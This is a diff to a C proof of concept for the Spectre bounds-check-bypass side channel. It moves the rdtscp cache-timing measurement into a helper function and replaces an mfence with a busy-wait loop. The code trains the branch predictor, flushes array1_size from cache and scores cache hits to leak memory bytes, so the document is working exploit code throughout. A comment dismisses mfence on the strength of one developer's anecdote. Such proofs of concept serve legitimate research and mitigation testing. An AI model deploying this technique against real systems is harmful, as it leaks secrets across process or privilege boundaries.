@@ -58,6 +58,15 @@ static inline uint8_t get_max_value()
 	return max;
 }
 
+static inline uint64_t get_access_delay(volatile char *addr)
+{
+	register uint64_t time1, time2;
+	unsigned junk;
+	time1 = __rdtscp(&junk);
+	junk = *addr;
+	return __rdtscp(&junk) - time1;
+}
+
 uint8_t probe_memory_byte(size_t offset)
 {
 	int tries, mix_i, k, j, i;
@@ -65,7 +74,6 @@ uint8_t probe_memory_byte(size_t offset)
 	volatile uint8_t *addr;
 	unsigned int junk = 0;
 	unsigned int ret = -1;
-	register uint64_t start, time;
 
 	memset(results, 0, sizeof(results));
 
@@ -81,7 +89,9 @@ uint8_t probe_memory_byte(size_t offset)
 		for (j = 29; j >= 0; j--)
 		{
 			_mm_clflush(&array1_size); // flush the array1_size from cache to force a cache miss
-			_mm_mfence();							 // delay to ensure that the clflush is finished
+			// delay to ensure that the clflush is finished, if they tell you that you can also mfence 
+			// they're lying, it only works on slower processors, lost 2 days on this
+			for (volatile int z = 0; z < 100; z++) {} 
 
 			// Fancy way to set x to a value smaller that array1_size if every 6th iteration
 			// This is used to train the bredictor to predict the branch to be taken
@@ -99,10 +109,7 @@ uint8_t probe_memory_byte(size_t offset)
 		{
 			mix_i = ((i * 167) + 13) & 255;
 			addr = &array2[mix_i * 512];
-			start = __rdtscp(&junk);
-			junk = *addr; // access addr
-			time = __rdtscp(&junk) - start;
-			if ((int)time <= CACHE_HIT_THRESHOLD && mix_i != array1[training_x])
+			if ((int)get_access_delay(addr) <= CACHE_HIT_THRESHOLD && mix_i != array1[training_x])
 				results[mix_i]++; /* cache hit -> score +1 for this value */
 		}
 	}
